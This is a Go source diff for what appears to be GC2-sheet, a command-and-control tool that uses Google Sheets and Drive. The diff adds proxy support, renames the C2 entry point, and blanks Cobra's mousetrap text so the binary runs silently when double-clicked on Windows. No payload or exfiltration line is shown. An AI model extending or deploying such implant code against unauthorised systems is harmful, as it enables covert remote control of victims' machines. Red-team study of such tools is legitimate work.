@@ -5,6 +5,7 @@ import (
 	"GC2-sheet/internal/configuration"
 	"GC2-sheet/internal/utils"
 	_ "embed"
+	"net/url"
 	"os"
 
 	"github.com/spf13/cobra"
@@ -33,7 +34,17 @@ var rootCmd = &cobra.Command{
 
 			yaml.Unmarshal(configurationFileContent, &configurationFile)
 
-			configuration.SetOptions(configurationFile.Key, configurationFile.Sheet, configurationFile.Drive, configurationFile.Verbose)
+			proxyUrl, err := url.Parse(configurationFile.Proxy)
+
+			if err != nil {
+				utils.LogFatalDebug("Proxy string invalid")
+			}
+
+			if configurationFile.Proxy == "" {
+				proxyUrl = nil
+			}
+
+			configuration.SetOptions(configurationFile.Key, configurationFile.Sheet, configurationFile.Drive, proxyUrl, configurationFile.Verbose)
 
 			utils.LogDebug("Using configuration file")
 		} else { // Using standard flags
@@ -46,16 +57,18 @@ var rootCmd = &cobra.Command{
 					utils.LogFatalDebug("Key file not found")
 				}
 			}
-			configuration.SetOptions(string(key), sheetIdFlag, driveIdFlag, debugFlag)
+			configuration.SetOptions(string(key), sheetIdFlag, driveIdFlag, nil, debugFlag)
 			utils.LogDebug("Using flags")
 		}
 
-		C2.Run()
+		C2.C2Init()
 
 	},
 }
 
 func init() {
+
+	cobra.MousetrapHelpText = ""
 
 	rootCmd.Flags().StringVarP(&credentialFlag, "key", "k", "", "GCP service account credential in JSON")
 
